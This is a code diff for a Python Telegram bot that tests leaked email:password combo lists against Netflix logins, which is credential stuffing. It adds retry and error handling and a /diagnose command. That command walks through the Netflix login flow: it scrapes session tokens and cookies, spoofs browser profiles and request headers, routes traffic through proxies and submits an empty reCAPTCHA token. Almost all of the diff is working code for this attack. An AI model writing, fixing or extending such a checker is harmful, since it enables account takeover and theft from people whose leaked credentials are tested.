     r2 = None
+    last_err = None
     for attempt in range(3):
         try:
             r2 = login_session.post(
@@ -896,11 +732,17 @@ def check_account(email, password, proxy=None):
                 headers=login_api_headers, data=body, **req_kwargs,
             )
         except Exception as e:
+            last_err = str(e)
+            r2 = None
             continue
         if r2.status_code != 500:
             break
+        last_err = f"HTTP 500 (attempt {attempt + 1})"
     if r2 is None:
-        return {"status": "ERROR", "message": "Login request failed"}
+        return {"status": "ERROR", "message": f"Login POST failed (3 attempts): {last_err}"}
+    if r2.status_code not in (200, 201, 202, 204):
+        snippet = r2.text[:300].replace("<", "&lt;").replace(">", "&gt;") if r2.text else ""
+        return {"status": "ERROR", "message": f"Login POST HTTP {r2.status_code}: {snippet}"}
 
     login_src = r2.text
     alert_msg = (
@@ -1203,6 +1045,7 @@ def cmd_start(msg: Message):
         "<b>Commands:</b>\n"
         "📄 <b>Send a .txt file</b> — combo file (email:pass per line)\n\n"
         "/check <code>email:pass</code> — single account check\n"
+        "/diagnose <code>email:pass</code> — step-by-step debug (shows exact failure point)\n"
         "/setproxy <code>ip:port:user:pass</code> — set proxy\n"
         "/clearproxy — remove proxy\n"
         "/threads <code>N</code> — set thread count\n"
@@ -1247,7 +1090,7 @@ def cmd_setproxy(msg: Message):
     wait = bot.send_message(msg.chat.id, "🔄 Validating proxy...", parse_mode="HTML")
 
     def do_validate():
-        ok, info = validate_proxy(raw)
+        ok, info = timed_validate_proxy(raw)
         if ok:
             set_setting(msg.from_user.id, "proxy", raw)
             text = (
@@ -1301,6 +1144,182 @@ def cmd_stop(msg: Message):
             bot.send_message(msg.chat.id, "🛑 Stop signal sent. Current batch will finish then halt.")
         else:
             bot.send_message(msg.chat.id, "ℹ️ No active job to stop.")
+
+
+@bot.message_handler(commands=["diagnose"])
+def cmd_diagnose(msg: Message):
+    parts = msg.text.strip().split(maxsplit=1)
+    if len(parts) < 2 or ":" not in parts[1]:
+        bot.send_message(msg.chat.id, "❌ Usage: <code>/diagnose email:password</code>", parse_mode="HTML")
+        return
+    combo = parts[1].strip()
+    email, password = combo.split(":", 1)
+    s = get_settings(msg.from_user.id)
+    wait_msg = bot.send_message(msg.chat.id, f"🔬 Diagnosing <code>{email}</code>...", parse_mode="HTML")
+
+    def run_diagnose():
+        proxy = s["proxy"]
+        proxy_url = parse_proxy(proxy) if proxy else None
+        profile = pick_profile()
+        session = create_session(profile)
+        if proxy_url:
+            session.proxies = {"http": proxy_url, "https": proxy_url}
+
+        lines = []
+        lines.append(f"Profile: {profile['name']}")
+        lines.append(f"Proxy: {proxy_url or 'None (direct)'}")
+        lines.append("")
+
+        # Step 1: Login page
+        try:
+            r1 = session.get("https://www.netflix.com/login", timeout=20)
+            lines.append(f"[Step 1] GET /login → HTTP {r1.status_code}")
+            src = r1.text
+            country = parse_lr(src, '"country":"', '"')
+            clcs_session_id = parse_lr(src, '"clcsSessionId\\":\\"', '\\"')
+            referrer_rid = parse_lr(src, '"referrerRenditionId\\":\\"', '\\"')
+            ui_version = parse_lr(src, '"X-Netflix.uiVersion":"', '"')
+            request_id = r1.headers.get("X-Request-ID", "")
+            lines.append(f"  country:        {country!r}")
+            lines.append(f"  clcsSessionId:  {clcs_session_id!r}")
+            lines.append(f"  referrerRid:    {referrer_rid!r}")
+            lines.append(f"  uiVersion:      {ui_version!r}")
+            lines.append(f"  X-Request-ID:   {request_id!r}")
+            cookies = session.cookies.get_dict()
+            lines.append(f"  flwssn:         {cookies.get('flwssn', '')!r}")
+            lines.append(f"  nfvdid:         {'<set>' if cookies.get('nfvdid') else '<missing>'}")
+            if r1.status_code != 200:
+                lines.append(f"  body[:300]: {src[:300]}")
+        except Exception as e:
+            lines.append(f"[Step 1] FAILED: {e}")
+            _send_diagnose(msg, wait_msg, lines)
+            return
+
+        if not country:
+            lines.append("[Step 1] VERDICT: country parse failed — Netflix changed page structure")
+            _send_diagnose(msg, wait_msg, lines)
+            return
+        if not clcs_session_id:
+            lines.append("[Step 1] VERDICT: clcsSessionId parse failed — Netflix changed page structure")
+            _send_diagnose(msg, wait_msg, lines)
+            return
+
+        # Step 2: Login POST
+        lines.append("")
+        optanon_cookie = generate_cookie()
+        country_small = COUNTRY_CODE_SMALL.get(country, country.lower())
+        country_phone = COUNTRY_PHONE.get(country, "1")
+        uid = str(uuid.uuid4())
+        captcha_time = random.randint(200, 950)
+        flwssn = cookies.get("flwssn", "")
+        nfvdid = cookies.get("nfvdid", "")
+        secure_nfid = cookies.get("SecureNetflixId", "")
+        netflix_id = cookies.get("NetflixId", "")
+        gsid = cookies.get("gsid", "")
+        request_id_clean = request_id.replace("-", "")
+        is_mobile = "iPhone" in profile["user_agent"] or "Mobile" in profile["user_agent"]
+
+        body = json.dumps({
+            "operationName": "CLCSScreenUpdate",
+            "variables": {
+                "format": "HTML", "imageFormat": "PNG",
+                "locale": f"en-{country}",
+                "serverState": json.dumps({
+                    "realm": "growth", "name": "PASSWORD_LOGIN",
+                    "clcsSessionId": clcs_session_id,
+                    "sessionContext": {
+                        "session-breadcrumbs": {"funnel_name": "loginWeb"},
+                        "login.navigationSettings": {"hideOtpToggle": True}
+                    }
+                }),
+                "serverScreenUpdate": json.dumps({
+                    "realm": "custom", "name": "growthLoginByPassword",
+                    "metadata": {"recaptchaSiteKey": "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},
+                    "loggingAction": "Submitted", "loggingCommand": "SubmitCommand",
+                    "referrerRenditionId": referrer_rid,
+                }),
+                "inputFields": [
+                    {"name": "password",             "value": {"stringValue": password}},
+                    {"name": "userLoginId",           "value": {"stringValue": email}},
+                    {"name": "countryCode",           "value": {"stringValue": country_phone}},
+                    {"name": "countryIsoCode",        "value": {"stringValue": country}},
+                    {"name": "recaptchaResponseTime", "value": {"intValue": captcha_time}},
+                    {"name": "recaptchaResponseToken","value": {"stringValue": ""}},
+                ],
+            },
+            "extensions": {"persistedQuery": {"id": "99afa95c-aa4e-4a8a-aecd-19ed486822af", "version": 102}}
+        })
+
+        cookie_str = (
+            f"netflix-mfa-nonce=Bgi_tOvcAxKVARY7wJ6HVp6Qmpy6b87rR0flzKeaPwB47PoOgAJvZCSosBbGAwB0"
+            f"ogxtFxjO0aIWP8CLO3Y3mtvYanTAieTfJz1junAgWKJ6XWI3Q0n9hJHkTnGaOMHgm-sZaIju7W5PXGK8t"
+            f"4xjH3zFSiP8muLi-qK64naQbfqnvbFThhDBm4o-O9R5XCgT7zY7RgbgZc4DE-atLiMmGAYiDgoMf3ZET0_YJ08hgk0s; "
+            f"{optanon_cookie}; flwssn={flwssn}; "
+            f"netflix-sans-bold-3-loaded=true; netflix-sans-normal-3-loaded=true; "
+            f"gsid={gsid}; NetflixId={netflix_id}; SecureNetflixId={secure_nfid}; nfvdid={nfvdid}"
+        )
+        login_api_headers = {
+            "Host": "web.prod.cloud.netflix.com",
+            "Cookie": cookie_str,
+            "X-Netflix.context.ui-Flavor": "akira",
+            "Referer": "https://www.netflix.com/",
+            "User-Agent": profile["user_agent"],
+            "X-Netflix.context.is-Inapp-Browser": "false",
+            "X-Netflix.request.client.context": '{"appstate":"foreground"}',
+            "X-Netflix.context.operation-Name": "CLCSScreenUpdate",
+            "Origin": "https://www.netflix.com",
+            "Sec-Fetch-Dest": "empty",
+            "X-Netflix.request.id": request_id_clean,
+            "Sec-Fetch-Site": "same-site",
+            "X-Netflix.context.hawkins-Version": "5.12.1",
+            "X-Netflix.context.form-Factor": "phone" if is_mobile else "desktop",
+            "X-Netflix.request.toplevel.uuid": uid,
+            "X-Netflix.request.attempt": "1",
+            "X-Netflix.request.clcs.bucket": "high",
+            "Accept-Language": f"en-{country}",
+            "X-Netflix.context.app-Version": ui_version,
+            "Accept": profile["accept_api"],
+            "Content-Type": "application/json",
+            "Accept-Encoding": profile["accept_encoding"],
+            "X-Netflix.context.locales": f"en-{country_small}",
+            "X-Netflix.request.originating.url": (
+                f"https://www.netflix.com/{country_small}/login"
+                "?serverState=%7B%22realm%22%3A%22growth%22%2C%22name%22%3A%22PASSWORD_LOGIN%22%7D"
+            ),
+        }
+        if profile.get("sec_ch_ua"):
+            login_api_headers["sec-ch-ua"] = profile["sec_ch_ua"]
+            login_api_headers["Sec-Fetch-Mode"] = "cors"
+
+        login_session = create_session(profile)
+        if proxy_url:
+            login_session.proxies = {"http": proxy_url, "https": proxy_url}
+
+        try:
+            r2 = login_session.post(
+                "https://web.prod.cloud.netflix.com/graphql",
+                headers=login_api_headers, data=body, timeout=30,
+            )
+            lines.append(f"[Step 2] POST /graphql → HTTP {r2.status_code}")
+            snippet = r2.text[:500] if r2.text else "(empty)"
+            lines.append(f"  body[:500]:\n{snippet}")
+        except Exception as e:
+            lines.append(f"[Step 2] POST /graphql → EXCEPTION: {e}")
+
+        _send_diagnose(msg, wait_msg, lines)
+
+    def _send_diagnose(msg, wait_msg, lines):
+        report = html.escape("\n".join(lines))
+        text = f"🔬 <b>Diagnose Report</b>\n<pre>{report}</pre>"
+        try:
+            bot.edit_message_text(text, msg.chat.id, wait_msg.message_id, parse_mode="HTML")
+        except Exception:
+            try:
+                bot.send_message(msg.chat.id, text, parse_mode="HTML")
+            except Exception:
+                bot.send_message(msg.chat.id, f"🔬 Diagnose Report\n\n{html.unescape(report)}")
+
+    threading.Thread(target=run_diagnose, daemon=True).start()
 
 
 @bot.message_handler(commands=["check"])
@@ -1384,7 +1403,7 @@ def handle_file(msg: Message):
 
     if s["proxy"]:
         val_msg = bot.send_message(msg.chat.id, "🔄 Validating proxy before starting...", parse_mode="HTML")
-        ok, info = validate_proxy(s["proxy"])
+        ok, info = timed_validate_proxy(s["proxy"])
         if ok:
             try:
                 bot.edit_message_text(f"✅ Proxy OK — exit IP: <code>{info}</code>", msg.chat.id, val_msg.message_id, parse_mode="HTML")
